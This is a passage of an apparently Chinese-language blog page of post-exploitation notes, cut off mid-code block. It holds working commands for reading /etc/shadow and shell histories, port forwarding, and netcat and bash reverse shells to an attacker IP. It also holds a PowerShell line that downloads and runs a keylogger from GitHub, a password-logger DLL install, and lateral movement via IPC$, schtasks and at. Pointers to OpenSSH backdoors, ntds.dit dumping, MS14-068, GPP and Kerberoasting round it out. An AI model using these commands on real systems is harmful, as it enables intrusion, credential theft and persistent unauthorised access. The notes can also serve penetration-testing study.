/etc/sysconfig<span class=\"built_in\">/network </span></span><br><span class=\"line\">cat /etc/networks </span><br><span class=\"line\">iptables-L </span><br><span class=\"line\">hostname </span><br><span class=\"line\">dnsdomainname</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络通信\"><a href=\"#网络通信\" class=\"headerlink\" title=\"网络通信\"></a>网络通信</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">netstat -antup</span></span><br><span class=\"line\"><span class=\"attribute\">netstat -antpx</span></span><br><span class=\"line\"><span class=\"attribute\">netstat -tulpn</span></span><br><span class=\"line\"><span class=\"attribute\">arp -e</span></span><br><span class=\"line\"><span class=\"attribute\">route</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户信息\"><a href=\"#用户信息\" class=\"headerlink\" title=\"用户信息\"></a>用户信息</h3><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id</span><br><span class=\"line\">who</span><br><span class=\"line\"><span class=\"built_in\">w</span></span><br><span class=\"line\">last</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/sudoers</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/passwd</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/<span class=\"built_in\">group</span></span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/shadow</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.bash_history </span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.nano_history</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.atftp_history</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.mysql_history </span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.php-history</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"日志信息\"><a href=\"#日志信息\" class=\"headerlink\" title=\"日志信息\"></a>日志信息</h3><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/httpd/logs/*</span><br><span class=\"line\">/var/log/*</span><br><span class=\"line\">/var/run/utmp</span><br></pre></td></tr></table></figure>\n\n<p>提权suid程序和写入目录</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查找有suid位或sgid位的程序</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm <span class=\"attribute\">-g</span>=s -o -perm <span class=\"attribute\">-u</span>=s -type f 2 &gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\">查找能写或进入的目录</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -writable -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm -o+w -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm -o+x -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>主动扫描</span><br><span class=\"line\">nmap,netdiscover,ping等</span><br><span class=\"line\"><span class=\"number\">2.</span>被动嗅探本机流量(arp,smb,netbios)等</span><br><span class=\"line\"><span class=\"number\">3.</span>本机残留信息</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"端口转发\"><a href=\"#端口转发\" class=\"headerlink\" title=\"端口转发\"></a>端口转发</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>在数据包用过网关(路由或防火墙)时,可将通信请求从一个地址和端口号组合重定向到另一个地址.</p>\n<h3 id=\"端口转发类型\"><a href=\"#端口转发类型\" class=\"headerlink\" title=\"端口转发类型\"></a>端口转发类型</h3><p>●本地端口转发</p>\n<p>●远程端口转发</p>\n<p>●动态端口转发</p>\n<h3 id=\"Windows下跨边界应用\"><a href=\"#Windows下跨边界应用\" class=\"headerlink\" title=\"Windows下跨边界应用\"></a>Windows下跨边界应用</h3><h4 id=\"Htran\"><a href=\"#Htran\" class=\"headerlink\" title=\"Htran\"></a>Htran</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#正向端口转发</span><br><span class=\"line\">\t服务端 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-tran</span> 8888 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.1</span> 3389</span><br><span class=\"line\">\t客户端 <span class=\"selector-tag\">nc</span> 服务端<span class=\"selector-tag\">IP</span><span class=\"selector-pseudo\">:8888</span></span><br><span class=\"line\">#反向端口转发</span><br><span class=\"line\">\t攻击机 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-listen</span> 1234 8888</span><br><span class=\"line\">\t服务端 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-slave</span> 攻击<span class=\"selector-tag\">IP</span> 1234 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span> 3389</span><br><span class=\"line\">\t客户机 <span class=\"selector-tag\">nc</span> 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-pseudo\">:8888</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Lcx\"><a href=\"#Lcx\" class=\"headerlink\" title=\"Lcx\"></a>Lcx</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#监听<span class=\"number\">1234</span>,转发到<span class=\"number\">2333</span>端口</span><br><span class=\"line\">lcx.exe -<span class=\"section\">listen</span> <span class=\"number\">1234</span> <span class=\"number\">2333</span></span><br><span class=\"line\">#将目标<span class=\"number\">3389</span>转发到本地<span class=\"number\">1234</span></span><br><span class=\"line\">lcx.exe -slave ip <span class=\"number\">1234</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">3389</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Netsh\"><a href=\"#Netsh\" class=\"headerlink\" title=\"Netsh\"></a>Netsh</h4><h4 id=\"Fpipe\"><a href=\"#Fpipe\" class=\"headerlink\" title=\"Fpipe\"></a>Fpipe</h4><h4 id=\"Socks代理\"><a href=\"#Socks代理\" class=\"headerlink\" title=\"Socks代理\"></a>Socks代理</h4><h5 id=\"reGeorg\"><a href=\"#reGeorg\" class=\"headerlink\" title=\"reGeorg\"></a>reGeorg</h5><h5 id=\"ssocks\"><a href=\"#ssocks\" class=\"headerlink\" title=\"ssocks\"></a>ssocks</h5><h3 id=\"Linux下跨边界应用\"><a href=\"#Linux下跨边界应用\" class=\"headerlink\" title=\"Linux下跨边界应用\"></a>Linux下跨边界应用</h3><h4 id=\"rtcp-py\"><a href=\"#rtcp-py\" class=\"headerlink\" title=\"rtcp.py\"></a>rtcp.py</h4><p><a href=\"https://github.com/knownsec/rtcp\" target=\"_blank\" rel=\"noopener\">https://github.com/knownsec/rtcp</a></p>\n<h4 id=\"SSH-PUTTY\"><a href=\"#SSH-PUTTY\" class=\"headerlink\" title=\"SSH + PUTTY\"></a>SSH + PUTTY</h4><h4 id=\"netcat与socat端口转发\"><a href=\"#netcat与socat端口转发\" class=\"headerlink\" title=\"netcat与socat端口转发\"></a>netcat与socat端口转发</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat:</span><br><span class=\"line\">转发本地8888端口到192.168.1.1的80端口</span><br><span class=\"line\">mkfifo p</span><br><span class=\"line\">cat p | nc 192.168.17.143 80 | nc -l 8888 &gt; p</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat:</span><br><span class=\"line\">转发本地的1080端口到远程的8080端口(守护进程)</span><br><span class=\"line\">Nohup socat TCP4-LISTEN:1080,reuseaddr,fork</span><br><span class=\"line\">TCP4:192.168.1.1:8080</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Earthworm-跨平台内网穿透\"><a href=\"#Earthworm-跨平台内网穿透\" class=\"headerlink\" title=\"Earthworm:跨平台内网穿透\"></a>Earthworm:跨平台内网穿透</h3><h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><h4 id=\"Netcat\"><a href=\"#Netcat\" class=\"headerlink\" title=\"Netcat\"></a>Netcat</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">操作机</span></span><br><span class=\"line\">nc.exe -nvv -lp 4444</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">Windiw</span></span><br><span class=\"line\">nc.exe -e cmd IP 4444</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">Linux</span></span><br><span class=\"line\">nc -e /bin/bash IP 4444</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Bash\"><a href=\"#Bash\" class=\"headerlink\" title=\"Bash\"></a>Bash</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"python-Perl-Php反弹\"><a href=\"#python-Perl-Php反弹\" class=\"headerlink\" title=\"python/Perl/Php反弹\"></a>python/Perl/Php反弹</h4><h2 id=\"密码记录与欺骗攻击\"><a href=\"#密码记录与欺骗攻击\" class=\"headerlink\" title=\"密码记录与欺骗攻击\"></a>密码记录与欺骗攻击</h2><h3 id=\"密码记录工具\"><a href=\"#密码记录工具\" class=\"headerlink\" title=\"密码记录工具\"></a>密码记录工具</h3><h4 id=\"Winlogonhack\"><a href=\"#Winlogonhack\" class=\"headerlink\" title=\"Winlogonhack\"></a>Winlogonhack</h4><p>通过hook相关函数来记录登录密码</p>\n<h4 id=\"Ntpass\"><a href=\"#Ntpass\" class=\"headerlink\" title=\"Ntpass\"></a>Ntpass</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">安装:\trundll32 NTPass.dll,Install</span><br><span class=\"line\">移除: rundll32 NTPass.dll,Remove</span><br><span class=\"line\">口令保存位置: %systemroot%\\system32\\eulagold.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Get-Keystrokes-ps1\"><a href=\"#Get-Keystrokes-ps1\" class=\"headerlink\" title=\"Get-Keystrokes.ps1\"></a>Get-Keystrokes.ps1</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\\log.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Invoke-CredentialsPhish-ps1\"><a href=\"#Invoke-CredentialsPhish-ps1\" class=\"headerlink\" title=\"Invoke-CredentialsPhish.ps1\"></a>Invoke-CredentialsPhish.ps1</h4><p><a href=\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1\" target=\"_blank\" rel=\"noopener\">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1</a></p>\n<h4 id=\"Openssh后门\"><a href=\"#Openssh后门\" class=\"headerlink\" title=\"Openssh后门\"></a>Openssh后门</h4><p>概念:OpenSSH是SSH协议的免费开源实现.</p>\n<h4 id=\"Openssh-backdoor-kit\"><a href=\"#Openssh-backdoor-kit\" class=\"headerlink\" title=\"Openssh-backdoor-kit\"></a>Openssh-backdoor-kit</h4><p><a href=\"https://github.com/jivoi/openssh-backdoor-kit\" target=\"_blank\" rel=\"noopener\">https://github.com/jivoi/openssh-backdoor-kit</a></p>\n<p>留后门</p>\n<h4 id=\"linux键盘记录sh2log\"><a href=\"#linux键盘记录sh2log\" class=\"headerlink\" title=\"linux键盘记录sh2log\"></a>linux键盘记录sh2log</h4><h3 id=\"ARP与DNS欺骗攻击\"><a href=\"#ARP与DNS欺骗攻击\" class=\"headerlink\" title=\"ARP与DNS欺骗攻击\"></a>ARP与DNS欺骗攻击</h3><h4 id=\"arp欺骗攻击\"><a href=\"#arp欺骗攻击\" class=\"headerlink\" title=\"arp欺骗攻击\"></a>arp欺骗攻击</h4><h5 id=\"Cain\"><a href=\"#Cain\" class=\"headerlink\" title=\"Cain\"></a>Cain</h5><h5 id=\"Abel\"><a href=\"#Abel\" class=\"headerlink\" title=\"Abel\"></a>Abel</h5><h4 id=\"DNS欺骗攻击\"><a href=\"#DNS欺骗攻击\" class=\"headerlink\" title=\"DNS欺骗攻击\"></a>DNS欺骗攻击</h4><h2 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h2><h4 id=\"SMB协议利用\"><a href=\"#SMB协议利用\" class=\"headerlink\" title=\"SMB协议利用\"></a>SMB协议利用</h4><p>SMB(服务器消息块)网络文件共享系统</p>\n<p>msf扫描:    auxiliary/scanner/smb/smb_login</p>\n<h5 id=\"MS17-010\"><a href=\"#MS17-010\" class=\"headerlink\" title=\"MS17-010\"></a>MS17-010</h5><h4 id=\"跨平台横向移动-wmi利用\"><a href=\"#跨平台横向移动-wmi利用\" class=\"headerlink\" title=\"跨平台横向移动 [ wmi利用 ]\"></a>跨平台横向移动 [ wmi利用 ]</h4><p><a href=\"https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ</a></p>\n<ul>\n<li>wmi是什么 ?</li>\n<li>想成功利用wmi进行横向移动的前提条件又是什么 ?</li>\n<li>如何利用win自带的wmic工具纯手工对目标windows机器进行各种远程操作</li>\n<li>关于wmi在powershell下的一些常规应用</li>\n<li>如何借助各种外部wmi工具更方便的实现远程执行及半交互式shell获取</li>\n<li>基于wmi的跨平台横向移动</li>\n<li>关于CobaltStrike以及msf自带的wmi横向功能模块利用</li>\n</ul>\n<h4 id=\"计划任务利用\"><a href=\"#计划任务利用\" class=\"headerlink\" title=\"计划任务利用\"></a>计划任务利用</h4><h5 id=\"ipc\"><a href=\"#ipc\" class=\"headerlink\" title=\"ipc\"></a>ipc</h5><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use <span class=\"symbol\">\\\\</span>192.168.111.201<span class=\"symbol\">\\I</span>PC$ /user:\"administrator\" \"admin\"</span><br><span class=\"line\">copy C:<span class=\"symbol\">\\U</span>sers<span class=\"symbol\">\\g</span>uanxingzhou<span class=\"symbol\">\\D</span>esktop<span class=\"symbol\">\\p</span>utty.exe <span class=\"symbol\">\\\\</span>192.168.111.201<span class=\"symbol\">\\c</span>$</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"schtasks\"><a href=\"#schtasks\" class=\"headerlink\" title=\"schtasks\"></a>schtasks</h5><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks <span class=\"string\">/create</span> <span class=\"string\">/s</span> 192.168.0.70 <span class=\"string\">/u</span> Administrator <span class=\"string\">/p</span> admin <span class=\"string\">/ru</span> <span class=\"string\">\"SYSTEM\"</span> <span class=\"string\">/tn</span> CMDNAME <span class=\"string\">/sc</span> DAILY <span class=\"string\">/st</span> 22<span class=\"function\">:18</span> <span class=\"string\">/tr</span> C:\\\\Users\\\\college\\\\Desktop\\\\sha\\\\cmd.bat <span class=\"string\">/F</span></span><br><span class=\"line\">at</span><br><span class=\"line\">at \\\\192.168.3.102 19<span class=\"function\">:30</span> <span class=\"string\">/every</span><span class=\"function\">:5</span>,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"at\"><a href=\"#at\" class=\"headerlink\" title=\"at\"></a>at</h5><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">at <span class=\"symbol\">\\\\</span>192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:<span class=\"symbol\">\\w</span>indows<span class=\"symbol\">\\t</span>emp<span class=\"symbol\">\\c</span>md.bat</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"域内信息收集\"><a href=\"#域内信息收集\" class=\"headerlink\" title=\"域内信息收集\"></a>域内信息收集</h2><h3 id=\"Windows认证\"><a href=\"#Windows认证\" class=\"headerlink\" title=\"Windows认证\"></a>Windows认证</h3><h4 id=\"NTLM认证过程\"><a href=\"#NTLM认证过程\" class=\"headerlink\" title=\"NTLM认证过程\"></a>NTLM认证过程</h4><h4 id=\"Kerberos认证过程\"><a href=\"#Kerberos认证过程\" class=\"headerlink\" title=\"Kerberos认证过程\"></a>Kerberos认证过程</h4><h3 id=\"域用户消息\"><a href=\"#域用户消息\" class=\"headerlink\" title=\"域用户消息\"></a>域用户消息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看当前用户及sid</span></span><br><span class=\"line\">whoami /user</span><br><span class=\"line\"><span class=\"comment\">#查看用户组</span></span><br><span class=\"line\">whoami /proups</span><br><span class=\"line\"><span class=\"comment\">#查看用户权限</span></span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看域中用户组</span></span><br><span class=\"line\">net group /domain </span><br><span class=\"line\"><span class=\"comment\">#获得域管理员</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain admins\"</span> /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域控制器列表</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain controllers\"</span> /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域成员计算机列表</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain computers\"</span> /domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看域中用户</span></span><br><span class=\"line\">net user /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域密码策略设置,密码长短等</span></span><br><span class=\"line\">net accounts /domain</span><br><span class=\"line\"><span class=\"comment\">#列出或断开本机和连接的客户端会话</span></span><br><span class=\"line\">net session</span><br><span class=\"line\"><span class=\"comment\">#查询时间,可用来定位域控</span></span><br><span class=\"line\">net time /domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看所有域或工作组</span></span><br><span class=\"line\">net view /domain</span><br><span class=\"line\"><span class=\"comment\">#查看域或工作组下所有在线机器</span></span><br><span class=\"line\">net view /domain:&#123;name&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看共享</span></span><br><span class=\"line\">net share</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SRV\"><a href=\"#SRV\" class=\"headerlink\" title=\"SRV\"></a>SRV</h4><p>SRV是DNS中的一种资源记录,将服务名称映射到提供DNS服务的计算机名.</p>\n<p>利用Nslookup查询SRV</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup</span><br><span class=\"line\"><span class=\"built_in\">set</span> <span class=\"built_in\">type</span>=all</span><br><span class=\"line\"><span class=\"variable\">_ldap</span>.<span class=\"variable\">_tcp</span>.dc.<span class=\"variable\">_msdcs</span>.college.com</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SPN\"><a href=\"#SPN\" class=\"headerlink\" title=\"SPN\"></a>SPN</h4><p>服务主体名称,作用是对服务进行唯一标识.</p>\n<h5 id=\"Setspn-exe\"><a href=\"#Setspn-exe\" class=\"headerlink\" title=\"Setspn.exe\"></a>Setspn.exe</h5><p>spn命令行软件</p>\n<h4 id=\"ADFind-exe\"><a href=\"#ADFind-exe\" class=\"headerlink\" title=\"ADFind.exe\"></a>ADFind.exe</h4><p>活动目录查询工具</p>\n<p>官方文档:</p>\n<p><a href=\"http://www.joeware.net/freetools/tools/adfind/usage.htm\" target=\"_blank\" rel=\"noopener\">http://www.joeware.net/freetools/tools/adfind/usage.htm</a></p>\n<h4 id=\"PVEFindADUser-exe\"><a href=\"#PVEFindADUser-exe\" class=\"headerlink\" title=\"PVEFindADUser.exe\"></a>PVEFindADUser.exe</h4><p>项目地址:</p>\n<p><a href=\"https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn\" target=\"_blank\" rel=\"noopener\">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#显示每台计算机上登录用户</span></span><br><span class=\"line\">PVEFindaduser -current -noping</span><br><span class=\"line\"><span class=\"comment\">#查看172.17.0.132主机上登录的用户</span></span><br><span class=\"line\">PVEFindaduser -current -target <span class=\"number\">172.17</span>.<span class=\"number\">0.132</span></span><br><span class=\"line\"><span class=\"comment\">#查看每台计算机上传登录的用户</span></span><br><span class=\"line\">PVEFindaduser -last</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"NetView-exe\"><a href=\"#NetView-exe\" class=\"headerlink\" title=\"NetView.exe\"></a>NetView.exe</h4><p>收集域内主机共享,ip,是否域控等信息</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将主机名(或IP地址)列表保存在文件host.txt中</span></span><br><span class=\"line\">netview -f host.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Netsess-exe\"><a href=\"#Netsess-exe\" class=\"headerlink\" title=\"Netsess.exe\"></a>Netsess.exe</h4><p>列举目标主机上的NetBIOS session</p>\n<h4 id=\"Nltest-exe\"><a href=\"#Nltest-exe\" class=\"headerlink\" title=\"Nltest.exe\"></a>Nltest.exe</h4><p>测试域间信任关系</p>\n<p>CSVDE&amp;LDIFDE</p>\n<p>从ad ds中导入/导出数据.</p>\n<p>CSVDE -&gt; csv</p>\n<p>LDIFDE -&gt; ldif</p>\n<h4 id=\"ADExplorer-exe\"><a href=\"#ADExplorer-exe\" class=\"headerlink\" title=\"ADExplorer.exe\"></a>ADExplorer.exe</h4><p>查看域结构</p>\n<h4 id=\"LASPSearch\"><a href=\"#LASPSearch\" class=\"headerlink\" title=\"LASPSearch\"></a>LASPSearch</h4><p>Ldapsearch是linux下ldap客户端</p>\n<h4 id=\"离线凭证收集-1\"><a href=\"#离线凭证收集-1\" class=\"headerlink\" title=\"离线凭证收集\"></a>离线凭证收集</h4><p>域用户hash位置:域控上%WINDIR%\\ntds\\ntds.dit</p>\n<ol>\n<li><p>ntdsuti提取ntds.dit</p>\n</li>\n<li><p>使用ntdsdumpex</p>\n</li>\n</ol>\n<h4 id=\"Powershell利用\"><a href=\"#Powershell利用\" class=\"headerlink\" title=\"Powershell利用\"></a>Powershell利用</h4><h5 id=\"PowerSploit\"><a href=\"#PowerSploit\" class=\"headerlink\" title=\"PowerSploit\"></a>PowerSploit</h5><p>powershell渗透框架<br><a href=\"https://github.com/PowerShellMafia/PowerSploit\" target=\"_blank\" rel=\"noopener\">https://github.com/PowerShellMafia/PowerSploit</a></p>\n<h5 id=\"PowerView\"><a href=\"#PowerView\" class=\"headerlink\" title=\"PowerView\"></a>PowerView</h5><p><a href=\"https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\" target=\"_blank\" rel=\"noopener\">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>\n<h2 id=\"域内横向移动\"><a href=\"#域内横向移动\" class=\"headerlink\" title=\"域内横向移动\"></a>域内横向移动</h2><h3 id=\"横向拓展常见漏洞\"><a href=\"#横向拓展常见漏洞\" class=\"headerlink\" title=\"横向拓展常见漏洞\"></a>横向拓展常见漏洞</h3><h4 id=\"MS14-068\"><a href=\"#MS14-068\" class=\"headerlink\" title=\"MS14-068\"></a>MS14-068</h4><p>MS14-068可以使任意一个普通域用户提升至域管理员权限</p>\n<p>利用工具:<a href=\"https://github.com/gentilkiwi/kekeo\" target=\"_blank\" rel=\"noopener\">https://github.com/gentilkiwi/kekeo</a></p>\n<h4 id=\"GPP漏洞\"><a href=\"#GPP漏洞\" class=\"headerlink\" title=\"GPP漏洞\"></a>GPP漏洞</h4><p>组策略对象:组策略容器(GPC)和组策略模板(GPT)</p>\n<p>组策略模板位置:%systemroot%\\sysvol\\domainname\\Policies{GUID}</p>\n<p>当管理员使用(为所有域成员主机添加本地用户)的组策略首选项后,域成员会下载groups.xml文件,里面有新建用户信息,可解密.</p>\n<p>利用工具:Get-GPPPassword.</p>\n<h4 id=\"SPN票据破解\"><a href=\"#SPN票据破解\" class=\"headerlink\" title=\"SPN票据破解\"></a>SPN票据破解</h4><p>破解方法</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RC4加密方式使用tgsrepcrack.py</span><br><span class=\"line\">AES加密方式通过kirbi2john转换为hash,通过john/hashcat破解</span><br></pre></td></tr></table></figure>\n\n<p>SPN扫描</p>\n<p>获取破解SPN票据</p>\n<p>使用字典进行破解</p>\n<h4 id=\"Mimikatz后渗透中应用\"><a href=\"#Mimikatz后渗透中应用\" class=\"headerlink\" title=\"Mimikatz后渗透中应用\"></a>Mimikatz后渗透中应用</h4><h5 id=\"Pass-The-Hash\"><a href=\"#Pass-The-Hash\" class=\"headerlink\" title=\"Pass-The-Hash\"></a>Pass-The-Hash</h5><ol>\n<li><p>了解NTLM认证过程</p>\n</li>\n<li><p>使用mimikatz进行hash传递攻击过程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td 